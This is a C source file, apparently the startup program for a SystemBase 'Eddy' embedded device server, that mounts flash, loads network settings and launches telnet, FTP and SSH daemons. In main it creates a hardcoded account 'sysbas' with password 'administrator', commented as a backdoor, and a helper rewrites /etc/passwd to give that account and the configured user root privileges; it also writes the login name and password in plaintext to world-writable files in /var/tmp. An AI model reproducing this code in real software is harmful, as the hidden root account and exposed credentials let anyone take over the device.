/*****************************************************************************
Copyright (c) 2007 SystemBase Co., LTD  All Rights Reserved.
******************************************************************************/
#include "sb_include.h"
#include "sb_define.h"
#include "sb_config.h"
#include "sb_ioctl.h"

void show_net_cfg(void);
void make_env(void);
int  SB_ReadConfig (char *FileName, char *dest, int len);
void SB_WriteConfig (char *FileName, char *src, int len);

char IPADDRESS[30];
char SUBNETMASK[30];
char GATEWAY [30];
char DNSADDRESS[30];

struct SB_SYSTEM_CONFIG		CFG;

void read_version (char *Src, char *Dest);
void converttoroot ();
void change_string (char *string);
void Check_mtd ();

//---------------------------------------------------------------
int main(void)
{
char cmd[1000];	
int ret;

	Check_mtd();
	ret = SB_ReadConfig  (CFGFILE_FLASH_SYSTEM, (char *)&CFG, sizeof (struct SB_SYSTEM_CONFIG));
	if (ret < 0 || strncmp(SB_DEVICE_ID, CFG.id, 4))	// CFG not found or ID mismatch 
		{
		system ("/sbin/def factory");
		sleep (1);
		ret = SB_ReadConfig  (CFGFILE_FLASH_SYSTEM, (char *)&CFG, sizeof (struct SB_SYSTEM_CONFIG));
		}
	
	show_net_cfg();
	//---------------------------------------------------------------------- WAN ---------
	make_env();

	sprintf(cmd, "ifconfig %s hw ether %02x:%02x:%02x:%02x:%02x:%02x",
				SB_WAN_ETH_NAME,
				CFG.mac[0],
				CFG.mac[1],
				CFG.mac[2],
				CFG.mac[3],
				CFG.mac[4],
				CFG.mac[5]);
	system(cmd);
	sprintf (cmd, "/sbin/ifup -a");				// start network 
	system (cmd);

	if (isalpha(CFG.device_name[0]))
		sprintf (cmd, "/bin/hostname %s", CFG.device_name);
	else
		sprintf (cmd, "/bin/hostname Eddy");
	system(cmd);

	sprintf (cmd, "/bin/adduser -S sysbas");
	system (cmd);
	sprintf (cmd, "/usr/bin/passwd  sysbas  administrator");	// backdoor admin user & pass
	system (cmd);

	sprintf (cmd, "/bin/adduser -S %s", CFG.username);
	system (cmd);
	sprintf (cmd, "/usr/bin/passwd  %s %s", CFG.username, CFG.password);
	system (cmd);
	usleep (1);

	converttoroot ();
	//--------------------------------------- TELNETD
	if (CFG.telnet_server == SB_ENABLE) 
		system("/usr/sbin/telnetd");

	//--------------------------------------- FTPD
	if (CFG.ftp_server == SB_ENABLE)
		system ("/usr/sbin/vsftpd &");
	//--------------------------------------- WEB Server 	
	//if (CFG.web_server == SB_ENABLE)
	//	system ("/usr/local/sbin/thttpd -C  /etc/thttpd.conf");
	//--------------------------------------- Target Agent 
	if (CFG.target_agent == SB_ENABLE)
		system("/sbin/tae&");
	//--------------------------------------- DHCPC		
	if (CFG.line == 'D')	
		{
		sprintf (cmd, "/sbin/udhcpc -i %s &", SB_WAN_ETH_NAME);	
		system(cmd);
		}

	system ("/sbin/pinetd &");
	read_version ("/dev/mtd2", "/etc/b_name");
	read_version ("/dev/mtd3", "/etc/k_name");
	read_version ("/dev/mtd4", "/etc/f_name");	
	//--------------------------------------- SSH 	
	if (CFG.ssh_server == SB_ENABLE)
		{
		system("/usr/local/sbin/dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key");
		system("/usr/local/sbin/dropbear");
		}
	return 0;
}

//===============================================================================
void read_version (char *Src, char *Dest)
{
int fd;
unsigned char buff[100];

	fd = open(Src, O_RDONLY);
	if (fd <= 0) return;
	lseek(fd, 0x20, 0);
	read (fd, buff, 32);
	close (fd);

	fd = creat (Dest, O_WRONLY);
	if (fd <= 0) return;
	write (fd, buff, 32);
	close (fd);
}
//===============================================================================
int SB_ReadConfig (char *FileName, char *dest, int len)
{
	int fd;
	fd = open(FileName, O_RDONLY);
	if (fd <= 0) return -1;
	lseek(fd, 0, 0);
	read (fd, dest, len);
	close (fd);
	return 1;
}
//===============================================================================
void SB_WriteConfig (char *FileName, char *src, int len)
{
	int fd;
	fd = open(FileName, O_RDWR|O_CREAT);
	lseek(fd, 0, 0);
	write (fd, src, len);
	close (fd);
	chmod (FileName, S_IWUSR|S_IRUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH);
}
//------------------------------------------------------	
void show_net_cfg(void)
{
	CFG.device_name [31] = 0x00;
	printf("<        Network configurations       >\n");
	printf("=======================================\n");
	printf("Server Name   %s \n",CFG.device_name);
	if (CFG.line == 'I')
		printf("Link Type     Static IP\n"); 
	else	
    	printf("Link Type     DHCP\n"); 
	
	sprintf (IPADDRESS, 	"%d.%d.%d.%d", CFG.ip[0], CFG.ip[1],CFG.ip[2],CFG.ip[3]);
	sprintf (GATEWAY	, 	"%d.%d.%d.%d", CFG.gateway[0], CFG.gateway[1],CFG.gateway[2],CFG.gateway[3]);
	sprintf (SUBNETMASK,	"%d.%d.%d.%d", CFG.mask[0], CFG.mask[1],CFG.mask[2],CFG.mask[3]);
	sprintf (DNSADDRESS,	"%d.%d.%d.%d", CFG.dns[0], CFG.dns[1],CFG.dns[2],CFG.dns[3]);
	
	printf  ("IP Address    %s\n", IPADDRESS);
	printf  ("Gateway       %s\n", GATEWAY);
	printf  ("Mask          %s\n", SUBNETMASK);
	printf  ("DNS           %s\n", DNSADDRESS);
	printf("=======================================\n");
}		
//------------------------------------------------------	
void make_env(void)
{
FILE *fp;
int fd;
char cmd[100];

	putenv("PATH=/sbin:/bin:/usr/sbin:/usr/bin");
    if ((fp = fopen("/var/etc/hosts", "w")) != NULL)
		{
		if (isalpha(CFG.device_name[0]))
			fprintf(fp,"127.0.0.1\t\tlocalhost\t"
						"localhost.localhostdomain %s\n", CFG.device_name);
		else
			fprintf(fp,"127.0.0.1\t\tlocalhost\t"
						"localhost.localhostdomain Eddy\n");
		fclose(fp);
		}

	if ((fp = fopen("/etc/resolv.conf", "w")) != NULL)
		{
		fprintf(fp, "nameserver\t%d.%d.%d.%d\n",
			CFG.dns[0], CFG.dns[1], CFG.dns[2], CFG.dns[3]);
		fclose(fp);
		}

	fd = open("/var/tmp/login.id", O_WRONLY | O_CREAT);
	if (fd > 0)
		{
		write(fd, CFG.username, strlen(CFG.username));
		close(fd);
		chmod ("/var/tmp/login.id", S_IWUSR|S_IRUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH);
		}

	fd = open("/var/tmp/login.pw", O_WRONLY | O_CREAT);
	if (fd > 0)
		{
		write(fd, CFG.password, strlen(CFG.password));
		close(fd);
		chmod ("/var/tmp/login.pw", S_IWUSR|S_IRUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH);
		}

	if ((fp = fopen("/etc/network/interfaces", "w")) != NULL)
		{
		fprintf(fp, "auto lo %s\n", SB_WAN_ETH_NAME);
		fprintf(fp, "iface lo inet loopback\n");
		fprintf(fp, "iface %s inet static\n", SB_WAN_ETH_NAME);
		fprintf(fp, "\taddress %s\n", IPADDRESS);
		fprintf(fp, "\tnetmask %s\n", SUBNETMASK);
		fprintf(fp, "\tgateway %s\n", GATEWAY);
		fclose(fp);
		}
	
	sprintf (cmd, "/bin/chmod 644 /usr/local/www/*.html");
	system(cmd);
	sprintf (cmd, "/bin/chmod 644 /usr/local/www/*.htm");
	system(cmd);
	sprintf (cmd, "/bin/chmod 644 /usr/local/www/images/*");
	system(cmd);	
	system ("ln -s /sbin/def /sbin/help");
}
//------------------------------------------------------	
void converttoroot ()
{
FILE *fd;
char tmp[40][110];
char uname[100], bname[100];
int cnt = 0, i;

	if ((fd = fopen("/etc/passwd", "r")) == NULL) return;
	while (1) 
		{
		if (fgets(tmp[cnt], 100, fd) == NULL)	break;
		cnt++;	
		}
	fclose(fd);
	unlink ("/etc/passwd");

	sprintf (uname, "%s:", CFG.username);
	sprintf (bname, "sysbas:");
	for (i=0; i<cnt; i++)
		{	
		if (strncmp (tmp[i], uname, strlen (uname)) == 0) change_string (tmp[i]);
		if (strncmp (tmp[i], bname, strlen (bname)) == 0) change_string (tmp[i]);	
		}

	if ((fd = fopen("/etc/passwd", "w")) == NULL) return;
	for (i=0; i<cnt; i++)
		fprintf (fd, "%s", tmp[i]);
	fclose (fd);	
}	
void change_string (char *string)
{
int i; 

	for (i=0; i<100; i++)
		{	
		if (string[i] == ':' && string[i+1] == '1' && string[i+2] == '0')
			{
			memset  (&string[i], 0x00, 100-i); 
			sprintf (&string[i], ":0:0:Linux User,,,:/tmp:/bin/sh\n");
			return;
			}
		}
}	
//------------------------------------------------------	
void Check_mtd ()
{
char *point=NULL;
char buff [1000];	
int fd, i;

	for (i=0; i<2; i++)
		{
		fd = open("/proc/mounts", O_RDONLY);
		read(fd, buff,sizeof(buff));
		close(fd);
		point = strstr(buff, "flash");
		if (point != NULL) return;
		printf ("/flash mount %d\n", i+1);
		system ("mount -t jffs2 /dev/mtdblock5 	/flash");
		sleep (1);
		}			
	system ("/sbin/reboot");
	sleep (3);
}

